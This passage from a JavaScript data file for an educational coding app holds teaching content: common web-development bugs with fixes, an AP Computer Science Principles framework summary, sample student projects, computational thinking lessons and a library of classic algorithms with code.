      bug: 'Image doesn\'t display: 404 in dev tools',
      cause: 'Image path is wrong, or file doesn\'t exist where expected.',
      fix: 'Check file path (relative vs absolute). Check spelling. Check file actually exists.',
      example: '<!-- BAD: -->\n<img src="image.png"> <!-- where? -->\n\n<!-- GOOD: -->\n<img src="./images/image.png">',
      whenItHappens: 'Common when moving files. When paths are written without checking.',
    },
    {
      bug: 'Click handler fires twice',
      cause: 'addEventListener called multiple times (often inside another function that gets called repeatedly).',
      fix: 'Remove existing listener with removeEventListener, or attach once.',
      example: '// BAD (inside render):\nfunction render() {\n  document.getElementById("btn").addEventListener("click", handler);\n}\nrender(); // Adds 1 listener\nrender(); // Adds another! Now click fires handler twice.\n\n// GOOD:\ndocument.getElementById("btn").addEventListener("click", handler);\n// Just call it once at startup.',
      whenItHappens: 'Re-rendering pattern with addEventListener inside.',
    },
    {
      bug: 'Form submits + reloads page unexpectedly',
      cause: 'Default form behavior submits + reloads. Need to preventDefault.',
      fix: 'event.preventDefault() in handler. Or use onclick on a non-submit button.',
      example: '<!-- BAD: -->\n<form>\n  <input>\n  <button>Submit</button>\n</form>\n<script>\n  document.querySelector("form").addEventListener("submit", function() {\n    // Page reloads! This handler runs but submit happens.\n    console.log("submit");\n  });\n</script>\n\n<!-- GOOD: -->\n<form>\n  <input>\n  <button>Submit</button>\n</form>\n<script>\n  document.querySelector("form").addEventListener("submit", function(event) {\n    event.preventDefault();\n    console.log("submit"); // No reload!\n  });\n</script>',
      whenItHappens: 'Anytime user submits a form via Enter or Submit button.',
    },
    {
      bug: 'setTimeout/setInterval not running',
      cause: 'Tab is in background (browsers throttle). Or callback isn\'t a function. Or cleared.',
      fix: 'Use document.visibilityState API. Make sure callback is actually a function.',
      example: '// BAD:\nsetTimeout(myFunc(), 1000); // myFunc() returns undefined, sets timeout for undefined!\n\n// GOOD:\nsetTimeout(myFunc, 1000); // Pass the function, not call it.',
      whenItHappens: 'Misunderstanding of function reference vs function call.',
    },
    {
      bug: 'Multiple async calls finish out of order',
      cause: 'Async operations don\'t wait for each other. Last to start can finish first.',
      fix: 'Use await + sequential awaits. Or Promise.all for parallel. Or check current state before updating.',
      example: '// BAD (out of order):\nfor (let i = 0; i < 3; i++) {\n  setTimeout(() => console.log(i), Math.random() * 1000);\n}\n// Outputs in random order\n\n// GOOD:\nasync function inOrder() {\n  for (let i = 0; i < 3; i++) {\n    await new Promise(r => setTimeout(r, 500));\n    console.log(i);\n  }\n}',
      whenItHappens: 'Multiple fetch/timer/IO operations launched simultaneously.',
    },
    {
      bug: 'JSON.parse: Unexpected token',
      cause: 'String passed to JSON.parse isn\'t valid JSON. Common with empty responses, HTML error pages, or single quotes.',
      fix: 'Wrap in try/catch. Validate that string is JSON before parsing.',
      example: '// BAD:\nconst data = JSON.parse(response); // Throws if HTML\n\n// GOOD:\ntry {\n  const data = JSON.parse(response);\n} catch (e) {\n  console.error("Invalid JSON:", e);\n}',
      whenItHappens: 'API returns HTML error page. Response is empty. String has single quotes.',
    },
    {
      bug: 'localStorage not persisting',
      cause: 'Trying to store non-string. Or browser privacy mode. Or different domain/protocol.',
      fix: 'JSON.stringify() before storing. Wrap in try/catch.',
      example: '// BAD:\nconst data = { name: "Alice" };\nlocalStorage.setItem("user", data); // Stores "[object Object]"\n\n// GOOD:\nlocalStorage.setItem("user", JSON.stringify(data));\nconst user = JSON.parse(localStorage.getItem("user"));',
      whenItHappens: 'Storing objects directly. Storing in incognito mode.',
    },
    {
      bug: 'Click handler doesn\'t work on dynamic content',
      cause: 'Adding addEventListener to elements that get re-rendered + replaced.',
      fix: 'Use event delegation: attach to parent + check target.',
      example: '// BAD (loses listener on re-render):\nconst list = document.getElementById("list");\nlist.innerHTML = "<li>Item 1</li>";\ndocument.querySelector("li").addEventListener("click", handler);\nlist.innerHTML = "<li>Item 2</li>"; // New element, no listener!\n\n// GOOD (event delegation):\nlist.addEventListener("click", function(e) {\n  if (e.target.matches("li")) handler(e);\n});\nlist.innerHTML = "<li>Item 2</li>"; // New element, still works!',
      whenItHappens: 'React-style re-rendering with vanilla JS event handlers.',
    },
    {
      bug: 'this is undefined in arrow function',
      cause: 'Arrow functions don\'t have their own this. They inherit from enclosing scope.',
      fix: 'Use function() {} if you need own this. Or bind explicitly. Or use arrow if you want lexical this.',
      example: '// In React class:\nclass Foo extends React.Component {\n  handleClick = () => {\n    this.state.x; // works — arrow inherits this from class\n  }\n  handleClick2() {\n    return function() { this.state.x; }; // BAD — this is undefined\n  }\n}',
      whenItHappens: 'Mixing function styles. Misunderstanding lexical scoping.',
    },
  ];

  // ─── AP CSP Big Ideas + Computational Thinking Practices ──────────
  // The College Board AP Computer Science Principles framework.
  // Used by educators to align lessons to AP standards.
  var AP_CSP_FRAMEWORK = {
    bigIdeas: [
      {
        id: 'BI1',
        title: 'Creative Development',
        description: 'Computing innovations come from creative work. Iterative development + collaboration are central.',
        learningObjectives: [
          'CRD-1.A: How innovation results from collaboration',
          'CRD-1.B: How investigation + research inform development',
          'CRD-2.A: Iterative development cycle',
          'CRD-2.B: Identifying program errors',
        ],
        examples: [
          'Designing the user interface of a new app — researching what users need',
          'Iterating on a design based on user feedback',
          'Debugging through systematic testing',
        ],
        appLabConnection: 'AppLab supports CRD-2.A: students iterate via the "Enhance" feature, testing + refining their AI-generated apps.',
      },
      {
        id: 'BI2',
        title: 'Data',
        description: 'Programs use, transform, and store data. Data has structure + meaning.',
        learningObjectives: [
          'DAT-1.A: Data types',
          'DAT-1.B: Binary numbers',
          'DAT-1.C: Compression',
          'DAT-2.A: Lossless vs lossy data',
          'DAT-2.B: Information from data',
          'DAT-2.D: Data privacy',
        ],
        examples: [
          'Storing user preferences in localStorage',
          'Converting between number bases',
          'Compressing images for the web',
        ],
        appLabConnection: 'AppLab projects (To-Do, Habit Tracker, etc.) require students to design data structures.',
      },
      {
        id: 'BI3',
        title: 'Algorithms + Programming',
        description: 'Algorithms are step-by-step solutions. Programming is implementing algorithms in a programming language.',
        learningObjectives: [
          'AAP-1.A: Identify variables',
          'AAP-2.A: Express logic with operators',
          'AAP-2.B: Express algorithms with sequences, selection, iteration',
          'AAP-3.A: Algorithm efficiency',
          'AAP-4.A: Procedural abstraction (functions)',
          'AAP-4.B: Recursion',
        ],
        examples: [
          'Implementing a search algorithm',
          'Writing reusable functions',
          'Comparing algorithm efficiency (Big-O)',
        ],
        appLabConnection: 'AppLab\'s ALGORITHMS tab provides 30+ algorithm exemplars aligned to AAP-2 and AAP-3.',
      },
      {
        id: 'BI4',
        title: 'Computer Systems + Networks',
        description: 'Computers + the internet enable global communication + collaboration.',
        learningObjectives: [
          'CSN-1.A: The internet + IP addresses',
          'CSN-1.B: Routing + packets',
          'CSN-1.C: Parallel + sequential computing',
          'CSN-1.D: Fault tolerance',
        ],
        examples: [
          'How a search query travels from your browser to a server',
          'Why some pages load faster than others (CDN, caching)',
          'How packets reach their destination despite failures',
        ],
        appLabConnection: 'AppLab API-integrated projects (Weather Dashboard, Recipe Finder) demonstrate network calls.',
      },
      {
        id: 'BI5',
        title: 'Impact of Computing',
        description: 'Computing has profound + global impact on society. Ethics + consequences matter.',
        learningObjectives: [
          'IOC-1.A: Innovation\'s beneficial + harmful effects',
          'IOC-1.B: Digital divide + equity',
          'IOC-1.C: Computing bias',
          'IOC-1.D: Crowdsourcing + collective intelligence',
          'IOC-2.A: Computing security',
          'IOC-2.B: Computing in education',
          'IOC-2.C: Computing innovation\'s impact',
        ],
        examples: [
          'Algorithmic bias in hiring systems',
          'Digital divide between high + low income areas',
          'Crowdsourcing platforms like Wikipedia',
        ],
        appLabConnection: 'AppLab\'s WCAG 2.1 AA features + AI-generation tool let students directly engage with IOC-1.B + IOC-2.A.',
      },
    ],
    computationalThinkingPractices: [
      { id: 'CTP1', name: 'Computational solution design', description: 'Designing + implementing programs', skillCount: 6 },
      { id: 'CTP2', name: 'Algorithms + program development', description: 'Translating ideas into code', skillCount: 6 },
      { id: 'CTP3', name: 'Abstraction in program development', description: 'Using abstractions to manage complexity', skillCount: 4 },
      { id: 'CTP4', name: 'Code analysis', description: 'Reading + analyzing code', skillCount: 5 },
      { id: 'CTP5', name: 'Computing innovations', description: 'Investigating computing innovations', skillCount: 5 },
      { id: 'CTP6', name: 'Responsible computing', description: 'Ethical + societal considerations', skillCount: 3 },
    ],
    examInfo: {
      examName: 'AP Computer Science Principles',
      examDuration: '2 hours',
      sections: [
        { name: 'Section I — Multiple Choice', items: 70, time: '70 minutes', weight: '70%' },
        { name: 'Section II — Performance Task', items: '1 task', time: '12 hours over multiple class periods (before exam)', weight: '30%' },
      ],
      performanceTask: 'Create Performance Task — students design + develop a program of their own choosing, then submit + analyze their code in a written response.',
      passingScore: '3 out of 5 (typically ~50% correct on multiple choice + acceptable performance task)',
      collegeBoardURL: 'apcentral.collegeboard.org/courses/ap-computer-science-principles',
    },
  };

  // ─── Sample student work exemplars (AP CSP Create Performance Task)
  var STUDENT_EXEMPLARS = [
    {
      grade: '5th grade',
      project: 'My Spelling Practice App',
      excerpt: 'I made an app that helps me practice spelling words. I type a word + it asks me to spell it. If I get it right, I get a point. If I get it wrong, it shows me the right spelling.',
      strengths: ['Clear purpose', 'Simple but functional', 'Personal motivation'],
      growthAreas: ['Could add multiple word lists', 'Could track progress over time'],
      teacherFeedback: 'You\'ve solved a real problem you have! Adding a list of words you\'re working on would help you track progress.',
    },
    {
      grade: '7th grade',
      project: 'Pet Pomodoro Timer',
      excerpt: 'I made a Pomodoro timer where you take care of a virtual pet. Every Pomodoro you finish, the pet gets happier. If you ignore it for too long, it gets sad. This motivates me to actually do my work.',
      strengths: ['Creative motivation system', 'Combines productivity + game elements', 'User-centric design'],
      growthAreas: ['Save pet state across sessions', 'Add multiple pet types'],
      teacherFeedback: 'I love how you combined gamification with productivity. This is exactly what creative problem-solving looks like.',
    },
    {
      grade: '10th grade',
      project: 'Climate Data Visualizer',
      excerpt: 'I used NOAA temperature data + made an interactive chart showing how local temperatures have changed since 1900. Users can pick their city + see the trend. I learned to use the fetch API + the Chart.js library.',
      strengths: ['Real-world data', 'Civic engagement', 'Effective use of API + library', 'Strong technical execution'],
      growthAreas: ['Could add multiple data sources', 'Could discuss limitations of single-city data'],
      teacherFeedback: 'Excellent use of authentic data. Your conclusion about limitations of single-station data was thoughtful + showed scientific maturity.',
    },
    {
      grade: '12th grade (AP CSP Create PT)',
      project: 'Mindfulness Journaling App with Sentiment Analysis',
      excerpt: 'I built a journal app where you write daily entries. The app uses a simple sentiment analysis algorithm to detect positive vs negative words. Over time, it shows you trends in your mood. I implemented the sentiment analysis from scratch as a teaching exercise + then compared performance with the AWS Comprehend API.',
      strengths: ['Sophisticated algorithm implementation', 'Real-world application', 'Comparison of approaches', 'Privacy-respecting design (local-only)', 'AP CSP-ready documentation'],
      growthAreas: ['Could discuss ethics of mental-health data', 'Could add gentle "see professional" recommendation'],
      teacherFeedback: 'Excellent algorithm implementation + thoughtful comparison. Strong AP CSP Create Performance Task. Suggestion: include a note about when to seek professional help — important ethical consideration.',
    },
    {
      grade: '12th grade (AP CSP Create PT)',
      project: 'Personalized Allergen-Aware Recipe Finder',
      excerpt: 'My family has multiple food allergies. I built an app that lets you check off allergens + then searches a recipe database, filtering out recipes with those ingredients. Uses Spoonacular API + a custom ingredient cross-reference table (because allergen labels vary).',
      strengths: ['Solves a personal + family-wide problem', 'Custom database design', 'API integration', 'Strong technical foundation'],
      growthAreas: ['Add allergen severity levels (intolerance vs life-threatening)', 'Add a feature for users to suggest substitutions'],
      teacherFeedback: 'Excellent personal motivation + technical execution. This is something your family can actually use. Strong AP CSP Create Performance Task.',
    },
    {
      grade: '11th grade',
      project: 'AccessibilityChecker',
      excerpt: 'I built a tool that takes a webpage URL + scans for common accessibility issues: missing alt text, low color contrast, missing labels on form inputs. Returns a score + list of issues to fix.',
      strengths: ['Solves real-world problem', 'Demonstrates accessibility knowledge', 'Uses iframe + DOM parsing'],
      growthAreas: ['Could compare to existing tools (Lighthouse, axe-core)', 'Could explain WCAG levels clearly'],
      teacherFeedback: 'Strong contribution to accessibility. You\'re solving a real problem developers face every day.',
    },
    {
      grade: '6th grade',
      project: 'My Practice Planner',
      excerpt: 'I play piano + I always forget what to practice. I made an app where my teacher + I add what I need to work on. The app tracks how long I practice each thing. At the end of the week, I show my teacher the data.',
      strengths: ['Real authentic use', 'Multi-user (with teacher)', 'Data collection over time'],
      growthAreas: ['Could add reminders', 'Could compare across weeks'],
      teacherFeedback: 'This is a genuine product. The teacher integration is sophisticated — you\'re designing for two users at once.',
    },
    {
      grade: '9th grade',
      project: 'WaterMate (Hydration Tracker)',
      excerpt: 'I track how much water I drink. The app shows a progress bar to the daily goal + reminds me if I haven\'t drunk water in a while.',
      strengths: ['Personal health focus', 'Simple, effective design', 'Notification API use'],
      growthAreas: ['Add custom goals based on body weight', 'Connect to a fitness tracker API'],
      teacherFeedback: 'Clean implementation. The notification feature shows good understanding of web APIs.',
    },
  ];

  // ─── Computational thinking concepts (CSTA + ISTE aligned) ─────────
  // The 5 foundational pillars of computational thinking, with examples
  // + classroom activities + age-appropriate progression.
  var COMPUTATIONAL_THINKING = [
    {
      pillar: 'Decomposition',
      definition: 'Breaking a complex problem into smaller, manageable parts.',
      example: 'To build a calculator app, break it down: display, number buttons, operator buttons, calculation logic, result handling. Each part is simpler than the whole.',
      whyMatters: 'Complex problems are overwhelming. Decomposition makes them solvable + builds the skill of analyzing structure.',
      classroomActivity: 'Take any familiar task (making a sandwich, getting ready for school). Have students decompose into steps. Then refine into sub-steps. Compare across students.',
      ngss: 'NGSS Practice 3: Planning + carrying out investigations',
      csta: 'CSTA 2-AP-13 (grades 6-8): Decompose problems',
      ageProgression: 'K-2: Steps in a story. 3-5: Recipe + how-to steps. 6-8: Algorithm decomposition. 9-12: Module + function design.',
      mistakes: 'Common student mistake: trying to solve the whole problem at once. Teach: "What\'s the smallest piece you can solve right now?"',
    },
    {
      pillar: 'Pattern Recognition',
      definition: 'Identifying similarities or trends across problems.',
      example: 'A To-Do app + a Habit Tracker both store user items with timestamps. The same data pattern can be reused. Or: loops + functions are repeated patterns of operation.',
      whyMatters: 'Patterns mean we don\'t solve the same problem from scratch. Patterns become reusable code.',
      classroomActivity: 'Show 5 different apps. Ask students to identify what they have in common (forms, lists, buttons, etc.). Then identify what\'s different.',
      ngss: 'NGSS Crosscutting Concept 1: Patterns',
      csta: 'CSTA 2-AP-12 (grades 6-8): Generalize knowledge of patterns',
      ageProgression: 'K-2: Color patterns + sequences. 3-5: Repeated math operations. 6-8: Loop patterns + data patterns. 9-12: Design patterns.',
      mistakes: 'Pattern recognition is more than just "looks similar." Push students to articulate WHY the pattern works.',
    },
    {
      pillar: 'Abstraction',
      definition: 'Removing unnecessary details to focus on essentials. Creating + using simplifying models.',
      example: 'A "user" object has many fields. The abstraction is: we don\'t need ALL the details every time — sometimes just `user.name` is enough. Or: a function is an abstraction — input → output, ignoring internal complexity.',
      whyMatters: 'Without abstraction, every program would need to know every detail of every other part. Abstractions let us reason about + reuse code.',
      classroomActivity: 'A car has thousands of parts. The user only interacts with steering wheel + pedals + dashboard. Discuss: what details are abstracted away? Why?',
      ngss: 'NGSS Practice 2: Developing + using models',
      csta: 'CSTA 2-AP-14 (grades 6-8): Create procedures with parameters',
      ageProgression: 'K-2: "Pretend the box is a car." 3-5: Map representation. 6-8: Functions as abstractions. 9-12: Object-oriented design.',
      mistakes: 'Over-abstraction: too many layers becomes hard to follow. Under-abstraction: every program reimplements basics.',
    },
    {
      pillar: 'Algorithm Design',
      definition: 'Creating step-by-step procedures (algorithms) to solve problems.',
      example: 'To find the largest number in a list: start with first as max → loop through rest, update max if larger → return max. That\'s an algorithm.',
      whyMatters: 'Algorithms are the heart of computing. Better algorithms = faster, more efficient programs.',
      classroomActivity: 'Sorting a deck of cards: have students write the steps. Compare different sorting strategies (insertion, selection, bubble). Discuss efficiency.',
      ngss: 'NGSS Practice 3 + 5: Investigations + math thinking',
      csta: 'CSTA 2-AP-10 (grades 6-8): Use flowcharts/pseudocode',
      ageProgression: 'K-2: Sequence + repeat. 3-5: Conditionals. 6-8: Pseudocode. 9-12: Big-O notation + advanced algorithms.',
      mistakes: 'Forgetting edge cases (empty input, duplicates, large input). Teach defensive thinking: "What if there\'s zero? Negative? Maximum?"',
    },
    {
      pillar: 'Debugging',
      definition: 'Systematic process of finding + fixing errors.',
      example: 'Your code says "TypeError: cannot read property of undefined." Debugging: identify what\'s undefined → trace back to where it should have been set → fix.',
      whyMatters: 'Debugging is 50%+ of programming work. Students who can\'t debug are stuck. Students who can debug are independent.',
      classroomActivity: 'Give students code with a deliberate bug. Have them find it. Build the skill of reading + understanding code (not just writing).',
      ngss: 'NGSS Practice 7: Engaging in argument from evidence',
      csta: 'CSTA 2-AP-17 (grades 6-8): Systematically test + refine programs',
      ageProgression: 'K-2: Find the error in a sequence. 3-5: Trace through code. 6-8: Use console.log strategically. 9-12: Debugger tools + breakpoints.',
      mistakes: 'Random changes hoping it works. Teach: hypothesis → test → result → iterate.',
    },
  ];

  // ─── Algorithm exemplar library ─────────────────────────────────────
  // 30+ classic algorithms with code, complexity, when to use, when not to.
  var ALGORITHMS = [
    {
      name: 'Linear Search',
      category: 'Searching',
      complexity: 'O(n) — linear',
      whenUse: 'Small unsorted arrays. When you only search once or twice.',
      whenAvoid: 'Large data that\'s sorted (use binary search instead).',
      code: 'function linearSearch(arr, target) {\n  for (let i = 0; i < arr.length; i++) {\n    if (arr[i] === target) return i;\n  }\n  return -1;\n}',
      explanation: 'Walk through the array one by one, comparing each element to the target. Simplest search.',
      apClassroomConnection: 'AP CSP: Demonstrates O(n) iteration. Compare to binary search for performance discussion.',
    },
    {
      name: 'Binary Search',
      category: 'Searching',
      complexity: 'O(log n) — logarithmic',
      whenUse: 'Large SORTED arrays. Best search for sorted data.',
      whenAvoid: 'Unsorted data. Very small arrays (overhead not worth it).',
      code: 'function binarySearch(sortedArr, target) {\n  let low = 0, high = sortedArr.length - 1;\n  while (low <= high) {\n    const mid = Math.floor((low + high) / 2);\n    if (sortedArr[mid] === target) return mid;\n    if (sortedArr[mid] < target) low = mid + 1;\n    else high = mid - 1;\n  }\n  return -1;\n}',
      explanation: 'Divide + conquer. Check middle. If too small, search right half; too big, search left. Eliminates half each step.',
      apClassroomConnection: 'AP CSP key algorithm. Demonstrates logarithmic complexity. Use phone book analogy.',
    },
    {
      name: 'Bubble Sort',
      category: 'Sorting',
      complexity: 'O(n²) — quadratic',
      whenUse: 'Teaching purposes only. NEVER in production.',
      whenAvoid: 'Any real-world sorting. Use built-in sort.',
      code: 'function bubbleSort(arr) {\n  const result = [...arr];\n  for (let i = 0; i < result.length - 1; i++) {\n    for (let j = 0; j < result.length - 1 - i; j++) {\n      if (result[j] > result[j + 1]) {\n        [result[j], result[j + 1]] = [result[j + 1], result[j]];\n      }\n    }\n  }\n  return result;\n}',
      explanation: 'Compare adjacent pairs, swap if out of order. Largest element "bubbles" to end. Repeat. Simplest sort to understand.',
      apClassroomConnection: 'Classic intro sort. Compare to better algorithms for complexity discussion.',
    },
    {
      name: 'Selection Sort',
      category: 'Sorting',
      complexity: 'O(n²) — quadratic',
      whenUse: 'Teaching purposes. Small arrays where simplicity matters.',
      whenAvoid: 'Most real cases.',
      code: 'function selectionSort(arr) {\n  const result = [...arr];\n  for (let i = 0; i < result.length - 1; i++) {\n    let minIdx = i;\n    for (let j = i + 1; j < result.length; j++) {\n      if (result[j] < result[minIdx]) minIdx = j;\n    }\n    [result[i], result[minIdx]] = [result[minIdx], result[i]];\n  }\n  return result;\n}',
      explanation: 'Find minimum, swap to front. Repeat for rest. Minimum number of swaps but still O(n²) comparisons.',
      apClassroomConnection: 'Good for intuition: "find the smallest, put it first."',
    },
    {
      name: 'Insertion Sort',
      category: 'Sorting',
      complexity: 'O(n²) worst, O(n) best (nearly sorted)',
      whenUse: 'Small arrays. Nearly sorted data. Online sorting (data arrives one at a time).',
      whenAvoid: 'Large arrays.',
      code: 'function insertionSort(arr) {\n  const result = [...arr];\n  for (let i = 1; i < result.length; i++) {\n    let current = result[i];\n    let j = i - 1;\n    while (j >= 0 && result[j] > current) {\n      result[j + 1] = result[j];\n      j--;\n    }\n    result[j + 1] = current;\n  }\n  return result;\n}',
      explanation: 'Insert each element into its correct position in the already-sorted left portion.',
      apClassroomConnection: 'Like sorting cards in your hand. Often used in hybrid sorts (e.g., Tim Sort).',
    },
    {
      name: 'Quick Sort',
      category: 'Sorting',
      complexity: 'O(n log n) average, O(n²) worst',
      whenUse: 'General-purpose sorting. Built-in sorts often use it.',
      whenAvoid: 'When worst-case matters (use Merge Sort instead).',
      code: 'function quickSort(arr) {\n  if (arr.length <= 1) return arr;\n  const pivot = arr[Math.floor(arr.length / 2)];\n  const left = arr.filter((x, i) => x < pivot && i !== Math.floor(arr.length / 2));\n  const right = arr.filter((x, i) => x >= pivot && i !== Math.floor(arr.length / 2));\n  return [...quickSort(left), pivot, ...quickSort(right)];\n}',
      explanation: 'Pick pivot. Partition: smaller left, larger right. Recursively sort each side. Combine.',
      apClassroomConnection: 'Classic divide-and-conquer. Good intro to recursion.',
    },
    {
      name: 'Merge Sort',
      category: 'Sorting',
      complexity: 'O(n log n) — guaranteed',
      whenUse: 'When worst-case matters. Stable sort needed.',
      whenAvoid: 'Memory-constrained environments (uses O(n) extra space).',
      code: 'function mergeSort(arr) {\n  if (arr.length <= 1) return arr;\n  const mid = Math.floor(arr.length / 2);\n  const left = mergeSort(arr.slice(0, mid));\n  const right = mergeSort(arr.slice(mid));\n  return merge(left, right);\n}\n\nfunction merge(left, right) {\n  const result = [];\n  let i = 0, j = 0;\n  while (i < left.length && j < right.length) {\n    if (left[i] <= right[j]) result.push(left[i++]);\n    else result.push(right[j++]);\n  }\n  return [...result, ...left.slice(i), ...right.slice(j)];\n}',
      explanation: 'Divide array in half recursively. Merge sorted halves back together. Reliable O(n log n).',
      apClassroomConnection: 'Demonstrates divide-and-conquer + recursion + master theorem.',
    },
    {
      name: 'Recursion (factorial)',
      category: 'Recursion',
      complexity: 'O(n)',
      whenUse: 'When problem can be defined in terms of smaller version of itself.',
      whenAvoid: 'When recursion depth could exceed stack limit. Performance-critical paths.',
      code: 'function factorial(n) {\n  if (n <= 1) return 1; // base case\n  return n * factorial(n - 1); // recursive case\n}',
      explanation: 'A function calling itself. Must have a base case (stopping condition) to prevent infinite recursion.',
      apClassroomConnection: 'Foundational recursion example. Connect to math definition of factorial.',
    },
    {
      name: 'Fibonacci (recursive)',
      category: 'Recursion',
      complexity: 'O(2^n) — exponential (slow!)',
      whenUse: 'Teaching recursion + showing exponential complexity.',
      whenAvoid: 'In production. Use iteration or memoization.',
      code: 'function fib(n) {\n  if (n <= 1) return n;\n  return fib(n - 1) + fib(n - 2);\n}',
      explanation: 'Each Fibonacci number = sum of previous two. Recursive implementation is elegant but slow due to recomputation.',
      apClassroomConnection: 'Show students how to make this fast with memoization. Big-O lesson.',
    },
    {
      name: 'Fibonacci (memoized)',
      category: 'Dynamic Programming',
      complexity: 'O(n) — linear',
      whenUse: 'For Fibonacci or any problem with overlapping subproblems.',
      whenAvoid: 'When memory is constrained.',
      code: 'function fibMemo(n, memo = {}) {\n  if (n <= 1) return n;\n  if (memo[n] !== undefined) return memo[n];\n  memo[n] = fibMemo(n - 1, memo) + fibMemo(n - 2, memo);\n  return memo[n];\n}',
      explanation: 'Same as recursive but cache results. Each subproblem computed only once.',
      apClassroomConnection: 'Introduce dynamic programming. Show before/after benchmark.',
    },
    {
      name: 'Fisher-Yates Shuffle',
      category: 'Randomization',
      complexity: 'O(n)',
      whenUse: 'Shuffling an array uniformly.',
      whenAvoid: 'Never — this is the canonical shuffle.',
      code: 'function shuffle(arr) {\n  const result = [...arr];\n  for (let i = result.length - 1; i > 0; i--) {\n    const j = Math.floor(Math.random() * (i + 1));\n    [result[i], result[j]] = [result[j], result[i]];\n  }\n  return result;\n}',
      explanation: 'For each position from end to start, swap with a random earlier position. Produces uniform shuffle.',
      apClassroomConnection: 'Show common "bad" shuffles (Math.random-based sort). Discuss randomness + bias.',
    },
    {
      name: 'Find Maximum',
      category: 'Aggregation',
      complexity: 'O(n)',
      whenUse: 'Finding the largest item.',
      whenAvoid: 'When you need top-K (use a heap instead).',
      code: 'function findMax(arr) {\n  if (arr.length === 0) return undefined;\n  let max = arr[0];\n  for (let i = 1; i < arr.length; i++) {\n    if (arr[i] > max) max = arr[i];\n  }\n  return max;\n}',
      explanation: 'Walk through list, track largest seen so far.',
      apClassroomConnection: 'Foundational iteration pattern.',
    },
    {
      name: 'Count Frequency',
      category: 'Aggregation',
      complexity: 'O(n)',
      whenUse: 'Counting occurrences of items in a list.',
      whenAvoid: 'Rarely a problem to avoid.',
      code: 'function countFreq(arr) {\n  const counts = {};\n  for (const item of arr) {\n    counts[item] = (counts[item] || 0) + 1;\n  }\n  return counts;\n}',
      explanation: 'Use an object as a frequency map. Increment count for each occurrence.',
      apClassroomConnection: 'Object-as-map pattern. Very common in interviews.',
    },
    {
      name: 'Remove Duplicates',
      category: 'Filtering',
      complexity: 'O(n) using Set',
      whenUse: 'Getting unique items from an array.',
      whenAvoid: 'Rarely a problem.',
      code: 'function unique(arr) {\n  return [...new Set(arr)];\n}\n\n// Or with object/map:\nfunction uniqueAlt(arr) {\n  const seen = {};\n  return arr.filter(item => {\n    if (seen[item]) return false;\n    seen[item] = true;\n    return true;\n  });\n}',
      explanation: 'Set automatically deduplicates. Or use seen-tracker pattern.',
      apClassroomConnection: 'Set vs Array. Discuss when each is appropriate.',
    },
    {
      name: 'Reverse Array',
      category: 'Array Manipulation',
      complexity: 'O(n)',
      whenUse: 'When you need reverse order.',
      whenAvoid: 'Rarely a problem.',
      code: 'function reverse(arr) {\n  return [...arr].reverse();\n}\n\n// Or in-place:\nfunction reverseInPlace(arr) {\n  let left = 0, right = arr.length - 1;\n  while (left < right) {\n    [arr[left], arr[right]] = [arr[right], arr[left]];\n    left++;\n    right--;\n  }\n  return arr;\n}',
      explanation: 'Built-in Array.reverse() works. Or two-pointer in-place swap.',
      apClassroomConnection: 'Two-pointer technique demo.',
    },
    {
      name: 'Palindrome Check',
      category: 'String',
      complexity: 'O(n)',
      whenUse: 'Verify symmetry of a string.',
      whenAvoid: 'Rarely a problem.',
      code: 'function isPalindrome(str) {\n  const clean = str.toLowerCase().replace(/[^a-z0-9]/g, "");\n  let left = 0, right = clean.length - 1;\n  while (left < right) {\n    if (clean[left] !== clean[right]) return false;\n    left++;\n    right--;\n  }\n  return true;\n}',
      explanation: 'Clean string (lowercase, remove non-alpha). Two pointers from ends.',
      apClassroomConnection: 'String manipulation + two-pointer technique.',
    },
    {
      name: 'Two-Sum',
      category: 'Search',
      complexity: 'O(n) with hash, O(n²) naive',
      whenUse: 'Find pair that sums to target.',
      whenAvoid: 'Rarely a problem (just use the algorithm).',
      code: 'function twoSum(arr, target) {\n  const seen = {};\n  for (let i = 0; i < arr.length; i++) {\n    const need = target - arr[i];\n    if (seen[need] !== undefined) return [seen[need], i];\n    seen[arr[i]] = i;\n  }\n  return null;\n}',
      explanation: 'For each number, check if its complement (target - num) was seen. Hash map enables O(n).',
      apClassroomConnection: 'Classic interview problem. Demonstrates hash map use.',
    },
    {
      name: 'FizzBuzz',
      category: 'Classic',
      complexity: 'O(n)',
      whenUse: 'Teaching conditionals + modulo. Job interviews.',
      whenAvoid: 'Real problems.',
      code: 'function fizzBuzz(n) {\n  for (let i = 1; i <= n; i++) {\n    if (i % 15 === 0) console.log("FizzBuzz");\n    else if (i % 3 === 0) console.log("Fizz");\n    else if (i % 5 === 0) console.log("Buzz");\n    else console.log(i);\n  }\n}',
      explanation: 'Print 1 to N. Multiples of 3 → Fizz. Multiples of 5 → Buzz. Multiples of both → FizzBuzz.',
      apClassroomConnection: 'Famous interview filter problem. Demonstrates basic control flow.',
    },
    {
      name: 'Caesar Cipher',
      category: 'Cryptography',
      complexity: 'O(n)',
      whenUse: 'Teaching encryption basics. Educational.',
      whenAvoid: 'Real security (trivially breakable).',
      code: 'function caesarEncrypt(text, shift) {\n  return text.split("").map(char => {\n    const code = char.charCodeAt(0);\n    if (code >= 65 && code <= 90) {\n      return String.fromCharCode(((code - 65 + shift) % 26) + 65);\n    }\n    if (code >= 97 && code <= 122) {\n      return String.fromCharCode(((code - 97 + shift) % 26) + 97);\n    }\n    return char;\n  }).join("");\n}',
      explanation: 'Shift each letter by N positions in the alphabet. Wrap around at Z.',
      apClassroomConnection: 'AP CSP 6.A.1: Cybersecurity. Discuss why this is insecure.',
    },
    {
      name: 'Tree Traversal (DFS)',
      category: 'Tree Algorithms',
      complexity: 'O(n)',
      whenUse: 'Tree navigation. File system traversal.',
      whenAvoid: 'When BFS is needed (e.g., shortest path).',
      code: 'function dfs(node) {\n  if (!node) return;\n  console.log(node.value); // pre-order\n  if (node.children) {\n    node.children.forEach(dfs);\n  }\n  // For post-order: log after children\n  // For in-order (binary tree): log between left + right\n}',
      explanation: 'Depth-First Search. Recursively visit children. Pre/in/post-order variations.',
      apClassroomConnection: 'Tree data structure. Common in DOM traversal.',
    },
    {
      name: 'BFS (Breadth-First Search)',
      category: 'Tree/Graph Algorithms',
      complexity: 'O(n)',
      whenUse: 'Find shortest path in unweighted graph. Level-by-level exploration.',
      whenAvoid: 'Memory-constrained.',
      code: 'function bfs(root) {\n  const queue = [root];\n  const result = [];\n  while (queue.length > 0) {\n    const node = queue.shift();\n    if (!node) continue;\n    result.push(node.value);\n    if (node.children) {\n      queue.push(...node.children);\n    }\n  }\n  return result;\n}',
      explanation: 'Use a queue. Visit + enqueue children. Level-by-level traversal.',
